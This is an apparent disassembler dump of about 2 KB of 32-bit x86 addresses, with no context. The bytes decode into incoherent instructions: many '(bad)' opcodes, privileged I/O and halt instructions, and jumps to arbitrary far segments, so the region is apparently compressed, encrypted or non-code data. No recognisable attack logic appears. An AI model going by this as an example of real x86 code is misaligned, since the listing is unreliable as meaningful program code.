  420161:	push   eax
  420162:	leave  
  420163:	(bad)  [eax+0x5c]
  420166:	fld    DWORD PTR [esi+edx*4-0x6]
  42016a:	pop    esi
  42016b:	mov    dl,0x54
  42016d:	push   0x5a
  42016f:	jle    0x420125
  420171:	ret    0xff73
  420174:	mov    ch,0xb5
  420176:	sub    DWORD PTR [ebp+0x6],0xd01914ea
  42017d:	pop    ss
  42017e:	dec    esp
  42017f:	fs jnp 0x420181
  420182:	cli    
  420183:	(bad)  
  420184:	and    al,0x81
  420186:	loopne 0x42011c
  420188:	add    ebx,DWORD PTR [ebx]
  42018a:	idiv   BYTE PTR [ebp+0x75ad51a0]
  420190:	loopne 0x420204
  420192:	(bad)  
  420193:	push   ebx
  420194:	lods   al,BYTE PTR ds:[esi]
  420195:	rcl    DWORD PTR [edi+0x64ad7bc3],0xb
  42019c:	iret   
  42019d:	push   0x1a
  42019f:	in     eax,dx
  4201a0:	jns    0x420164
  4201a2:	jecxz  0x42017a
  4201a4:	mov    esp,0x858be06e
  4201a9:	add    al,0x96
  4201ab:	fiadd  WORD PTR [eax+0x35b029eb]
  4201b1:	(bad)  
  4201b2:	jmp    0xf397:0x7d65942a
  4201b9:	hlt    
  4201ba:	shr    DWORD PTR [edx],0xba
  4201bd:	test   BYTE PTR [eax],0x9b
  4201c0:	js     0x420167
  4201c2:	fbstp  TBYTE PTR [esi+0x27]
  4201c5:	pop    ds
  4201c6:	data16 or al,0x98
  4201c9:	mov    BYTE PTR [edx+0x5],al
  4201cc:	cmp    ebp,0xa1d5fc55
  4201d2:	dec    edx
  4201d3:	pop    esi
  4201d4:	int    0xd5
  4201d6:	add    DWORD PTR [edx-0x57c54cb2],edx
  4201dc:	mov    esi,0xdf30685e
  4201e1:	pop    eax
  4201e2:	dec    edi
  4201e3:	pusha  
  4201e4:	out    dx,eax
  4201e5:	mov    WORD PTR [edx-0x18],ss
  4201e8:	sub    al,0xcc
  4201ea:	push   ds
  4201eb:	or     ebx,DWORD PTR [eax+edi*4-0x3574000f]
  4201f2:	push   ebx
  4201f3:	les    esp,FWORD PTR ds:0xdbb48bab
  4201f9:	jle    0x42025d
  4201fb:	fs jmp 0x22fc691c
  420201:	pop    eax
  420202:	sub    DWORD PTR [ecx+0xc6544db],edi
  420208:	jmp    0x42026f
  42020a:	jne    0x4201c1
  42020c:	popf   
  42020d:	sub    eax,DWORD PTR [eax]
  42020f:	cmp    ebx,DWORD PTR [ebx+0x4c199e4]
  420215:	loope  0x420232
  420217:	imul   edi,DWORD PTR [edx],0x4da2a84c
  42021d:	hlt    
  42021e:	aad    0x8c
  420220:	test   BYTE PTR [ebp-0x56],dl
  420223:	mov    eax,ds:0x714abb63
  420228:	inc    ebx
  420229:	push   ecx
  42022a:	add    al,0x9f
  42022c:	jg     0x420280
  42022e:	icebp  
  42022f:	rcl    esp,1
  420231:	adc    BYTE PTR [ebp-0x5a],dl
  420234:	cmp    eax,0x894e15c5
  420239:	div    BYTE PTR [ebx+0xc257d36]
  42023f:	xchg   DWORD PTR [eax],eax
  420241:	leave  
  420242:	fs adc eax,0xf7e5945a
  420248:	xchg   esi,eax
  420249:	fild   DWORD PTR ds:0x74fb4d06
  42024f:	and    bh,dh
  420251:	dec    ecx
  420252:	sti    
  420253:	(bad)  
  420254:	sub    eax,0x3b8d9e5d
  420259:	pop    esi
  42025a:	or     esp,DWORD PTR [ebp-0x76]
  42025d:	pop    esi
  42025e:	jp     0x42027e
  420260:	clc    
  420261:	and    BYTE PTR [edx-0x7d],cl
  420264:	aaa    
  420265:	ja     0x4202da
  420267:	aaa    
  420268:	dec    esp
  420269:	rol    DWORD PTR [ebx+eax*4-0x16],0xaa
  42026e:	dec    ecx
  42026f:	sbb    cl,BYTE PTR [eax]
  420271:	xchg   edi,eax
  420272:	pusha  
  420273:	lock out dx,al
  420275:	mov    bh,0x7d
  420277:	scas   al,BYTE PTR es:[edi]
  420278:	pop    ss
  420279:	not    DWORD PTR [edx+edx*4-0x209bbaab]
  420280:	xchg   esi,eax
  420281:	lds    esp,FWORD PTR [esi+0x78d1e869]
  420287:	or     eax,esi
  420289:	es retf 0xf0c0
  42028d:	fisttp DWORD PTR [ebp-0x54]
  420290:	dec    ecx
  420291:	or     DWORD PTR [edx+0x6d],ebp
  420294:	in     eax,0x0
	...
  4202aa:	pop    ecx
  4202ab:	push   edi
  4202ac:	inc    ecx
  4202ad:	dec    ebx
  4202ae:	dec    edi
  4202af:	pop    edi
  4202b0:	pop    ebx
  4202b1:	push   edi
  4202b2:	sub    al,0x52
  4202b4:	xchg   DWORD PTR [ebx-0x64],esi
  4202b7:	push   edi
  4202b8:	mov    esp,0x191c977
  4202bd:	add    bl,dl
  4202bf:	push   es
  4202c0:	add    BYTE PTR [eax],al
  4202c2:	fcom   QWORD PTR [ebp-0x54]
  4202c5:	mov    bl,0x6f
  4202c7:	fcomp  QWORD PTR [edi-0x1]
  4202ca:	lahf   
  4202cb:	lods   eax,DWORD PTR ds:[esi]
  4202cc:	and    ebx,esi
  4202ce:	or     bh,dh
  4202d0:	xor    al,0x62
  4202d2:	cmp    DWORD PTR [ecx-0x4],ebp
  4202d5:	sar    DWORD PTR [edx],1
  4202d7:	pop    es
  4202d8:	(bad)  
  4202d9:	mov    esi,DWORD PTR [ecx-0x55]
  4202dc:	push   es
  4202dd:	adc    esi,esi
  4202df:	fs ds push ds
  4202e2:	and    al,0x56
  4202e4:	or     BYTE PTR [ecx+0x4e],bh
  4202e7:	push   ss
  4202e8:	outs   dx,DWORD PTR ds:[esi]
  4202e9:	scas   eax,DWORD PTR es:[edi]
  4202ea:	xor    BYTE PTR [edi+0x38a8d382],0xa9
  4202f1:	xchg   eax,eax
  4202f3:	pop    eax
  4202f4:	pop    ds
  4202f5:	mov    ebp,DWORD PTR [edi-0x41]
  4202f8:	push   0x1de03a6b
  4202fd:	and    ah,al
  4202ff:	sub    al,0x9a
  420301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420302:	inc    esp
  420303:	sti    
  420304:	mov    ebp,0xd1348946
  420309:	outs   dx,BYTE PTR ds:[esi]
  42030a:	sti    
  42030b:	jno    0x420298
  42030d:	push   0x504b17af
  420312:	dec    edi
  420313:	ss ret 0xca47
  420317:	shl    cl,1
  420319:	pop    esi
  42031a:	xchg   BYTE PTR [ecx-0x62998301],dl
  420320:	mov    edi,0xaed2eb4a
  420325:	sub    al,0xe2
  420327:	loope  0x42039c
  420329:	adc    ah,BYTE PTR [esi+0x583ccbf5]
  42032f:	mul    DWORD PTR [eax-0x5a98e56b]
  420335:	jae    0x42037e
  420337:	pop    esp
  420338:	neg    BYTE PTR [ecx-0x4d62a222]
  42033e:	pop    esp
  42033f:	jb     0x42031b
  420341:	cwde   
  420342:	pop    ss
  420343:	nop
  420344:	push   esi
  420345:	and    dh,bl
  420347:	lahf   
  420348:	push   ebp
  420349:	xchg   edi,eax
  42034a:	jle    0x42031a
  42034c:	je     0x4202f8
  42034e:	call   0x5f2204cd
  420353:	jo     0x4202e5
  420355:	add    BYTE PTR [ecx],bh
  420357:	xchg   ecx,eax
  420358:	mov    esp,0x8df23860
  42035d:	sub    bh,BYTE PTR [ebp-0x3beae374]
  420363:	iret   
  420364:	test   al,0x12
  420366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420367:	call   FWORD PTR [edi]
  420369:	dec    ebp
  42036a:	and    eax,0x1e20cbce
  42036f:	and    DWORD PTR [ecx+ebp*4],ecx
  420372:	xor    DWORD PTR [ebp+0x6ec13848],esp
  420378:	add    bh,al
  42037a:	pop    edi
  42037b:	fistp  WORD PTR [esi]
  42037d:	dec    esi
  42037e:	mov    dh,0xb
  420380:	xchg   ebp,eax
  420381:	sub    DWORD PTR [ebp+0x60],0xffffff9f
  420385:	fmul   QWORD PTR [edx+0x9]
  420388:	or     bh,BYTE PTR [edi+0x4f]
  42038b:	dec    ebx
  42038c:	and    eax,0xa2b663df
  420391:	(bad)  
  420392:	mov    dl,0x91
  420394:	shl    BYTE PTR [eax+0x465ca73b],1
  42039a:	imul   edi,ebx,0xffffffae
  42039d:	shl    DWORD PTR [eax],0xd3
  4203a0:	mov    esp,0x38875b24
  4203a5:	sahf   
  4203a6:	minps  xmm3,xmm2
  4203a9:	ret    
  4203aa:	add    cl,ah
  4203ac:	test   al,0x2b
  4203ae:	nop
  4203af:	jne    0x420349
  4203b1:	int3   
  4203b2:	in     al,0x26
  4203b4:	sub    esp,ebp
  4203b6:	scas   eax,DWORD PTR es:[edi]
  4203b7:	jecxz  0x420385
  4203b9:	fnsave [esi-0x16]
  4203bc:	xchg   ecx,eax
  4203bd:	push   eax
  4203be:	enter  0xcd22,0x38
  4203c2:	xor    edx,DWORD PTR [edx+eax*8]
  4203c5:	cvttps2pi mm7,QWORD PTR [eax+ecx*8+0x5e01bf8c]
  4203cd:	add    BYTE PTR [esi+0x7d87d986],al
  4203d3:	xchg   ebx,eax
  4203d4:	scas   al,BYTE PTR es:[edi]
  4203d5:	aas    
  4203d6:	mov    dl,0xff
  4203d8:	jae    0x4203f3
  4203da:	retf   
  4203db:	les    eax,FWORD PTR [esi+esi*8-0x2aa9666f]
  4203e2:	mov    dh,0xc6
  4203e4:	xlat   BYTE PTR ds:[ebx]
  4203e5:	call   0x297d49f9
  4203ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203eb:	mov    ds:0x912e76d2,al
  4203f0:	dec    edi
  4203f1:	pop    esp
  4203f2:	push   edi
  4203f3:	(bad)  
  4203f4:	(bad)  
  4203f5:	out    0x96,al
  4203f7:	into   
  4203f8:	daa    
  4203f9:	ja     0x420397
  4203fb:	imul   edi,ebx,0xffffffd8
  4203fe:	(bad)  
  4203ff:	out    dx,al
  420400:	dec    ebp
  420401:	jne    0x420426
  420403:	jmp    0xa16:0x1bc3ab38
  42040a:	ins    WORD PTR es:[edi],dx
  42040c:	inc    ebp
  42040d:	js     0x420431
  42040f:	repz mov ch,0x87
  420412:	repnz nop
  420414:	(bad)  
  420415:	repz mov ecx,0x4978fd36
  42041b:	popa   
  42041c:	mov    cl,0x6e
  42041e:	sub    esp,ebp
  420420:	pop    es
  420421:	fidivr WORD PTR [edx]
  420423:	mov    ebp,0xd87cd766
  420428:	xchg   ecx,eax
  420429:	stos   BYTE PTR es:[edi],al
  42042a:	(bad)  [ecx-0x41]
  42042d:	and    DWORD PTR [ecx-0x2a],ecx
  420430:	sub    cl,BYTE PTR [ebx+esi*8]
  420433:	jae    0x4204ad
  420435:	stos   BYTE PTR es:[edi],al
  420436:	out    dx,eax
  420437:	jg     0x420479
  420439:	mov    dh,0xea
  42043b:	cmc    
  42043c:	and    DWORD PTR [esp+ebp*8],0x8de5ebde
  420443:	retf   0xddd1
  420446:	leave  
  420447:	dec    eax
  420448:	ins    BYTE PTR es:[edi],dx
  420449:	mov    ch,0x22
  42044b:	outs   dx,DWORD PTR ds:[esi]
  42044c:	les    esp,FWORD PTR [ecx]
  42044e:	cmp    dl,BYTE PTR [ebx+0x7d]
  420451:	gs daa 
  420453:	iret   
  420454:	dec    ebp
  420455:	int    0x24
  420457:	mov    esp,0x181255dd
  42045c:	repz cmp BYTE PTR [edx+0x4da6c49e],0xe0
  420464:	mov    ebp,0x13e0c9fd
  420469:	pop    edx
  42046a:	packssdw mm0,QWORD PTR ds:0xaacf9dcb
  420471:	xchg   ecx,eax
  420472:	scas   al,BYTE PTR es:[edi]
  420473:	cdq    
  420474:	cmp    bl,BYTE PTR [ebp-0x64ab5a32]
  42047a:	enter  0x5fbd,0x78
  42047e:	hlt    
  42047f:	rcl    BYTE PTR [eax-0x1eb2c416],1
  420485:	xchg   BYTE PTR [ebx+0x57d251d3],bl
  42048b:	not    DWORD PTR [ebp+0x24c9408e]
  420491:	sub    DWORD PTR [edi-0x37],ebp
  420494:	xchg   BYTE PTR [eax+0x1b],bl
  420497:	jmp    ecx
  420499:	pop    esi
  42049a:	enter  0x2efa,0x4f
  42049e:	mov    dh,0xfa
  4204a0:	mov    esp,DWORD PTR [esi-0x4a]
  4204a3:	or     eax,DWORD PTR [ecx+0x31]
  4204a6:	cdq    
  4204a7:	mov    esp,DWORD PTR [eax]
  4204a9:	pop    ebx
  4204aa:	sahf   
  4204ab:	add    edi,DWORD PTR [ebx-0x73]
  4204ae:	aam    0x7a
  4204b0:	imul   edi,DWORD PTR [ebx+0x5d],0x6823caab
  4204b7:	(bad)  
  4204b9:	std    
  4204ba:	pop    edx
  4204bb:	popa   
  4204bc:	pop    esi
  4204bd:	addr16 out 0x36,al
  4204c0:	sbb    BYTE PTR [eax+0x742df0be],bh
  4204c6:	add    ebp,DWORD PTR [ebp+0x3c]
  4204c9:	inc    esi
  4204ca:	jno    0x420532
  4204cc:	rcr    DWORD PTR [ecx],cl
  4204ce:	xchg   ch,bh
  4204d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204d1:	cld    
  4204d2:	scas   eax,DWORD PTR es:[edi]
  4204d3:	inc    edi
  4204d4:	xor    al,0x62
  4204d6:	call   0xb21626e6
  4204db:	push   ecx
  4204dc:	(bad)  
  4204dd:	dec    eax
  4204de:	jnp    0x420463
  4204e0:	int3   
  4204e1:	mov    al,0xcf
  4204e3:	mov    al,0xea
  4204e5:	pop    es
  4204e6:	jle    0x420518
  4204e8:	pop    eax
  4204e9:	mov    bh,0xac
  4204eb:	cmc    
  4204ec:	jg     0x4204f9
  4204ee:	js     0x42047a
  4204f0:	pcmpeqb mm3,QWORD PTR [edx+ebx*1-0x448bbf3a]
  4204f8:	jmp    0x1546:0x5303e3f6
  4204ff:	jle    0x4204ae
  420501:	jno    0x4204e6
  420503:	rcl    DWORD PTR ds:0x4890fead,0x25
  42050a:	xchg   edi,eax
  42050b:	in     eax,0xab
  42050d:	xor    ecx,DWORD PTR ds:0x65df2d58
  420513:	add    eax,0xf260b715
  420518:	xchg   esp,eax
  420519:	fcomi  st,st(7)
  42051b:	push   edi
  42051c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42051d:	pushf  
  42051e:	jmp    0xed926eb2
  420523:	neg    DWORD PTR [esi-0x36]
  420526:	mov    al,0x3
  420528:	sbb    cl,ah
  42052a:	stos   DWORD PTR es:[edi],eax
  42052b:	sbb    cl,cl
  42052d:	jmp    0x74adbb58
  420532:	int3   
  420533:	pop    es
  420534:	imul   BYTE PTR [ebx+0x5153ce0c]
  42053a:	add    edi,DWORD PTR [ebp-0x78867654]
  420540:	inc    edx
  420541:	stos   BYTE PTR es:[edi],al
  420542:	or     BYTE PTR [edi-0x25],ch
  420545:	jmp    0x420542
  420547:	test   eax,0x42e5967a
  42054c:	mov    ds:0xc82a8beb,eax
  420551:	pop    edx
  420552:	gs inc ecx
  420554:	sbb    eax,DWORD PTR [eax]
  420556:	mov    eax,0xd6e21e02
  42055b:	sub    BYTE PTR [ecx-0x6e],bh
  42055e:	pop    esi
  42055f:	mov    esp,0xb8634fa8
  420564:	mov    bh,0x94
  420566:	pop    ebx
  420567:	test   DWORD PTR [edi+eax*2-0x702980c3],esi
  42056e:	aaa    
  42056f:	ins    DWORD PTR es:[edi],dx
  420570:	inc    esi
  420571:	push   edi
  420572:	xchg   BYTE PTR [eax+0x4d],al
  420575:	in     al,dx
  420576:	xchg   edx,eax
  420577:	in     al,0x7
  420579:	push   es
  42057a:	push   ds
  42057b:	repnz push ss
  42057d:	pop    ebx
  42057e:	in     al,dx
  42057f:	das    
  420580:	(bad)  
  420581:	jno    0x4205d5
  420583:	jbe    0x42050d
  420585:	not    dh
  420587:	ins    DWORD PTR es:[edi],dx
  420588:	adc    DWORD PTR [ecx+0x7a],ebp
  42058b:	and    dl,BYTE PTR [ecx-0x213521ba]
  420591:	adc    al,0x4f
  420593:	pusha  
  420594:	aad    0xa7
  420596:	or     BYTE PTR [edi],bh
  420598:	(bad)  
  420599:	sub    eax,0x742c4a0
  42059e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42059f:	rcr    eax,1
  4205a1:	push   ss
  4205a2:	jecxz  0x4205e1
  4205a4:	cli    
  4205a5:	xchg   DWORD PTR [edx],ecx
  4205a7:	(bad)  
  4205a8:	mov    bl,0x72
  4205aa:	sub    BYTE PTR [ebp+0x32fc7b87],cl
  4205b0:	mov    eax,0x4b225d21
  4205b5:	ins    DWORD PTR es:[edi],dx
  4205b6:	ffree  st(2)
  4205b8:	xor    eax,0xee786eb7
  4205bd:	cdq    
  4205be:	push   ebp
  4205bf:	inc    ebp
  4205c0:	rcr    DWORD PTR [edi],1
  4205c2:	adc    al,BYTE PTR [ebp-0x4fdd06fc]
  4205c8:	mov    cl,0xd1
  4205ca:	sbb    eax,0x72ec1998
  4205cf:	or     DWORD PTR [edx-0x66],ecx
  4205d2:	and    DWORD PTR [edi+0x53],esp
  4205d5:	neg    BYTE PTR [esi-0xc1b17cf]
  4205db:	pop    ss
  4205dc:	cld    
  4205dd:	jno    0x420566
  4205df:	lock jle 0x42061a
  4205e2:	add    DWORD PTR [ebp+0x6d],ebx
  4205e5:	pusha  
  4205e6:	dec    ebx
  4205e7:	fist   WORD PTR [ebp+0xce6c636]
  4205ed:	sbb    al,0x47
  4205ef:	bnd ret 
  4205f1:	pop    eax
  4205f2:	push   ebx
  4205f3:	cmp    DWORD PTR [edi+esi*2-0x192e37af],ebx
  4205fa:	and    bl,0x4d
  4205fd:	adc    bh,BYTE PTR [edi-0x122d106d]
  420603:	mov    esi,0x38ea7dbc
  420608:	push   cs
  420609:	xor    al,0xd7
  42060b:	hlt    
  42060c:	mov    ch,0x7
  42060e:	dec    ebp
  42060f:	xor    ecx,DWORD PTR [edi-0x55]
  420612:	enter  0x6b95,0x77
  420616:	cli    
  420617:	lock imul ecx,DWORD PTR ss:[eax-0x5c],0x72f220b9
  420620:	push   edi
  420621:	push   esp
  420622:	and    ah,ah
  420624:	lahf   
  420625:	or     BYTE PTR [edi+0x28],0x5f
  420629:	cmp    al,0x7d
  42062b:	std    
  42062c:	(bad)  
  42062d:	sbb    bh,al
  42062f:	adc    DWORD PTR [ecx-0x2eb365f1],ecx
  420635:	imul   eax,eax,0x997f62c8
  42063b:	ins    BYTE PTR es:[edi],dx
  42063c:	mov    ah,0x25
  42063e:	mov    edi,0x8155ccfc
  420643:	cwde   
  420644:	fs lahf 
  420646:	aaa    
  420647:	jbe    0x4205e0
  420649:	(bad)
  42064c:	(bad)  
  42064d:	mov    al,ds:0x491fbadf
  420652:	or     DWORD PTR [esi],ebx
  420654:	sar    DWORD PTR gs:[ecx-0xd],1
  420658:	xor    ebx,DWORD PTR [eax]
  42065a:	jbe    0x420651
  42065c:	mov    dl,0x95
  42065e:	mov    al,al
  420660:	dec    ebp
  420661:	jl     0x4205f0
  420663:	lock mov dh,0xbe
  420666:	test   al,0x15
  420668:	xor    eax,0xd25e0fc5
  42066d:	into   
  42066e:	add    edx,DWORD PTR [esi+0x3013bd60]
  420674:	mov    cs,WORD PTR [edx-0x5e]
  420677:	retf   0x9c02
  42067a:	ds ret 0x91ae
  42067e:	cmp    dl,BYTE PTR [ecx]
  420680:	mov    ecx,0xcb03b909
  420685:	mov    al,BYTE PTR [eax*1+0x28d08afe]
  42068c:	aad    0x7a
  42068e:	adc    al,0x92
  420690:	push   0xb7e6ffe2
  420695:	jns    0x4206e2
  420697:	(bad)  
  420698:	mov    eax,ds:0xb87ba564
  42069d:	out    0x4d,al
  42069f:	mov    edx,0x44507943
  4206a4:	xchg   edx,eax
  4206a5:	and    esp,DWORD PTR [ebx-0x173877d7]
  4206ab:	pop    es
  4206ac:	or     eax,0x2644079f
  4206b1:	call   0xb2c9:0x4b1ad067
  4206b8:	test   dl,dl
  4206ba:	in     al,0x7d
  4206bc:	mov    cl,0xe2
  4206be:	outs   dx,DWORD PTR ds:[esi]
  4206bf:	jp     0x420693
  4206c1:	and    DWORD PTR [esi+eax*8],eax
  4206c4:	imul   esi,DWORD PTR [edi+0x4e],0xee413f5d
  4206cb:	jle    0x420712
  4206cd:	jle    0x420733
  4206cf:	cmp    esi,DWORD PTR [edx+0x56]
  4206d2:	fdivr  st,st(0)
  4206d4:	adc    eax,0xf2fb943
  4206d9:	popa   
  4206da:	cld    
  4206db:	in     al,dx
  4206dc:	pop    ecx
  4206dd:	dec    esp
  4206de:	dec    edx
  4206df:	cmc    
  4206e0:	xchg   esi,eax
  4206e1:	int    0xa1
  4206e3:	pushf  
  4206e4:	ins    DWORD PTR es:[edi],dx
  4206e5:	jns    0x420712
  4206e7:	sbb    cl,al
  4206e9:	mov    bl,0xca
  4206eb:	pop    ebx
  4206ec:	mov    esp,0xb7d6eb52
  4206f1:	(bad)  
  4206f2:	or     al,0x1d
  4206f4:	dec    ebp
  4206f5:	pop    ebx
  4206f6:	fcomp  QWORD PTR [ecx+edx*4-0x5ffb5cd0]
  4206fd:	imul   ebp,esi,0x49
  420700:	push   ds
  420701:	push   es
  420702:	test   BYTE PTR [ebp+0x2f],al
  420705:	sub    edi,ebp
  420707:	mov    ebp,0x67a02d55
  42070c:	retf   
  42070d:	(bad)  
  42070e:	sub    eax,0x3dd64a4f
  420713:	pushf  
  420714:	inc    esp
  420715:	sub    eax,0x1c3488aa
  42071a:	jns    0x420752
  42071c:	push   edx
  42071d:	mov    DWORD PTR [ebx],eax
  42071f:	outs   dx,BYTE PTR ds:[esi]
  420720:	push   ebx
  420721:	gs (bad) 
  420723:	sbb    edi,edx
  420725:	imul   DWORD PTR [edi]
  420727:	lock in al,0xf2
  42072a:	jecxz  0x420775
  42072c:	jo     0x42078b
  42072e:	loopne 0x4206e6
  420730:	mov    ebp,0xabbd3a62
  420735:	xor    dh,BYTE PTR [esp+ecx*2+0x70f3fadd]
  42073c:	pop    eax
  42073d:	pop    esp
  42073e:	mov    WORD PTR [edx],gs
  420740:	xchg   DWORD PTR [eax+0x3e594ce8],edx
  420746:	or     eax,0x62b6ff3a
  42074b:	cmp    ch,BYTE PTR [edi+0x649ca8f8]
  420751:	mov    esp,0xb23b3061
  420756:	test   ch,dh
  420758:	push   ebp
  420759:	add    ah,BYTE PTR ds:0xcc306ba0
  42075f:	(bad)  
  420760:	out    dx,eax
  420761:	cld    
  420762:	ins    DWORD PTR es:[edi],dx
  420763:	stos   BYTE PTR es:[edi],al
  420764:	adc    esp,DWORD PTR [edi+edx*2]
  420767:	xchg   ecx,eax
  420768:	mov    esi,ds
  42076a:	inc    edi
  42076b:	lods   eax,DWORD PTR ds:[esi]
  42076c:	retf   0xbb27
  42076f:	push   ebx
  420770:	fsubr  QWORD PTR [edx-0x24]
  420773:	jne    0x420742
  420775:	pop    edx
  420776:	push   cs
  420777:	xchg   esi,eax
  420778:	ss ret 
  42077a:	jo     0x4207da
  42077c:	fs jl  0x420784
  42077f:	pop    esi
  420780:	inc    eax
  420781:	dec    ecx
  420782:	sbb    ebp,DWORD PTR [eax-0x486584db]
  420788:	pop    eax
  420789:	mov    ebx,0x9e34e470
  42078e:	sbb    al,al
  420790:	jmp    0x4207be
  420792:	mov    ah,0x54
  420794:	shr    BYTE PTR [ebx],cl
  420796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420797:	xor    esp,DWORD PTR [edx-0x2a8a488e]
  42079d:	retf   
  42079e:	adc    eax,0xd662ec
  4207a3:	mov    edi,0x29e79035
  4207a8:	lds    ebx,FWORD PTR [edi*2-0x316701f4]
  4207af:	jbe    0x42074f
  4207b1:	pop    es
  4207b2:	mov    al,ds:0x767f5f15
  4207b7:	and    BYTE PTR [edi+esi*4+0x66],0xee
  4207bc:	adc    cl,dl
  4207be:	push   0xffffffc1
  4207c0:	cwde   
  4207c1:	jmp    0xe150:0xf570e8d2
  4207c8:	test   eax,0xe62bd783
  4207cd:	push   0xd0df04fb
  4207d2:	cli    
  4207d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207d4:	push   esi
  4207d5:	nop
  4207d6:	into   
  4207d7:	dec    edi
  4207d8:	sbb    BYTE PTR [ecx],bh
  4207da:	dec    eax
  4207db:	push   ebp
  4207dc:	inc    esi
  4207dd:	dec    ebp
  4207de:	jmp    0x2e5e1ce1
  4207e3:	add    al,0x23
  4207e5:	fs ins BYTE PTR es:[edi],dx
  4207e7:	xlat   BYTE PTR ds:[ebx]
  4207e8:	and    BYTE PTR [ebx+eax*1],ch
  4207eb:	retf   
  4207ec:	jle    0x420821
  4207ee:	gs jno 0x420820
  4207f1:	(bad)  [ebx*8+0x42b2aa1]
  4207f8:	jnp    0x4207bc
  4207fa:	and    eax,DWORD PTR [edi-0x46ebc0e5]
  420800:	mov    ds:0xb6f6a036,eax
  420805:	and    ebp,DWORD PTR [edx+ecx*4]
  420808:	inc    esp
  420809:	daa    
  42080a:	inc    ebx
  42080b:	dec    edx
  42080c:	pop    ds
  42080d:	add    BYTE PTR [eax],dl
  42080f:	adc    BYTE PTR [edx+0x14ab353f],dh
  420815:	jno    0x4207a1
  420817:	xchg   al,cl
  420819:	test   DWORD PTR [edx-0x58a60307],esi
  42081f:	loope  0x420835
  420821:	and    bh,bh
  420823:	shr    esp,1
  420825:	xchg   esi,eax
  420826:	mov    ds:0x49133e11,eax
  42082b:	test   al,0x40
  42082d:	jae    0x42080e
  42082f:	sbb    ch,cl
  420831:	(bad)  
  420832:	sahf   
  420833:	loop   0x420874
  420835:	inc    ebx
  420836:	call   0x12001471
  42083b:	daa    
  42083c:	(bad)  
  42083d:	pop    ebp
  42083e:	addr16 mov ds:0xd94,al
  420842:	mov    al,cl
  420844:	pop    esi
  420845:	imul   ecx,DWORD PTR [eax+ebp*2],0x75fc8379
  42084c:	inc    esi
  42084d:	(bad)  
  42084f:	mov    eax,DWORD PTR [edx]
  420851:	xchg   edi,eax
  420852:	sub    esi,edx
  420854:	call   0x6a98:0x3c234fbe
  42085b:	xchg   edi,eax
  42085c:	and    ebp,DWORD PTR [edx+0x7d]
  42085f:	pop    ecx
  420860:	and    eax,DWORD PTR ds:0x5aa8739f
  420866:	out    dx,al
  420867:	mov    dl,0x1d
  420869:	ret    0x99f1
  42086c:	mov    eax,0xa45fa491
  420871:	loopne 0x420815
  420873:	hlt    
  420874:	les    ecx,FWORD PTR [edi]
  420876:	out    dx,al
  420877:	mov    ds:0x376b2c9c,al
  42087c:	in     al,0x7c
  42087e:	dec    ecx
  42087f:	push   eax
  420880:	push   edi
  420881:	iret   
  420882:	xchg   esp,eax
  420883:	mov    cl,BYTE PTR [esi-0x50017f0d]
  420889:	scas   eax,DWORD PTR es:[edi]
  42088a:	mov    ebp,0x46e866a2
  42088f:	inc    ebx
  420890:	ret    
  420891:	or     ah,0xee
  420894:	repz aam 0xae
  420897:	not    BYTE PTR [esi+0x4d]
  42089a:	sti    
  42089b:	aad    0x42
  42089d:	sub    ah,BYTE PTR [eax]
  42089f:	enter  0xbde5,0x78
  4208a3:	xchg   ebp,eax
  4208a4:	shl    dl,1
  4208a6:	int3   
  4208a7:	and    al,0x74
  4208a9:	aad    0x52
  4208ab:	mov    edx,0x4edb33f7
  4208b0:	outs   dx,DWORD PTR ds:[esi]
  4208b1:	test   BYTE PTR [ecx],0x80
  4208b4:	xor    edx,DWORD PTR [ecx+edi*2-0x78]
  4208b8:	loope  0x420882
  4208ba:	jns    0x4208a0
  4208bc:	ja     0x420873
  4208be:	lahf   
  4208bf:	or     al,0x6f
  4208c1:	int    0xfe
  4208c3:	test   al,0x34
  4208c5:	aam    0x1d
  4208c7:	push   ds
  4208c8:	js     0x42086b
  4208ca:	cmp    edx,DWORD PTR [ecx-0x2c3bef9a]
  4208d0:	jl     0x4208a4
  4208d2:	fmul   DWORD PTR [ebp-0x4c]
  4208d5:	stos   BYTE PTR es:[edi],al
  4208d6:	add    BYTE PTR ds:0x42f37a65,bh
  4208dc:	xchg   ebp,eax
  4208dd:	mov    bl,0xfa
  4208df:	xchg   ebp,eax
  4208e0:	cmp    esp,DWORD PTR [esi]
  4208e2:	xchg   bl,bl
  4208e4:	sub    edx,esp
  4208e6:	iret   
  4208e7:	or     BYTE PTR [ecx+esi*1+0x1f],cl
  4208eb:	out    dx,al
  4208ec:	test   al,0xc3
  4208ee:	les    ecx,FWORD PTR [eax]
  4208f0:	xchg   ebp,eax
  4208f1:	mov    edi,0x1f488df7
  4208f6:	add    ebx,ecx
  4208f8:	ds in  al,0x7f
  4208fb:	aam    0x86
  4208fd:	outs   dx,DWORD PTR fs:[esi]
  4208ff:	sub    eax,0x4abf4ab2
  420904:	add    BYTE PTR [esi],dh
  420906:	dec    esp
  420907:	push   edi
  420908:	xor    DWORD PTR [eax-0x34],ecx
  42090b:	enter  0xbc53,0x8b
  42090f:	cmp    ecx,DWORD PTR [ebx-0x72]
  420912:	test   DWORD PTR [edi],ebp
  420914:	jb     0x420995
  420916:	call   0xbaa944b3
  42091b:	and    BYTE PTR [edi-0x19],dh
  42091e:	(bad)  
  42091f:	push   edi
  420920:	(bad)  
  420921:	in     al,0x33
  420923:	mov    al,0x71
  420925:	imul   eax,DWORD PTR cs:[ebx-0xe],0x4d6ac354
  42092d:	push   cs
  42092e:	into   
  42092f:	sub    bh,bh
  420931:	xor    dh,dh
  420933:	push   ebp
  420934:	dec    eax
  420935:	jno    0x420905
  420937:	cmp    eax,0xc10d9a64
  42093c:	cmp    al,0xc9
  42093e:	xor    eax,0x67289f2a
  420943:	fist   WORD PTR ds:0x1cbe77e9
  420949:	js     0x420992
  42094b:	pop    ebp
  42094c:	ret    0x6e01
  42094f:	cwde   
  420950:	pop    edx
  420951:	lea    edi,[ecx+0x74]
  420954:	sbb    DWORD PTR [ebx+ecx*4+0x3048b817],ecx
  42095b:	mov    eax,ds:0x232a2394
  420960:	inc    ecx
  420961:	dec    ebp
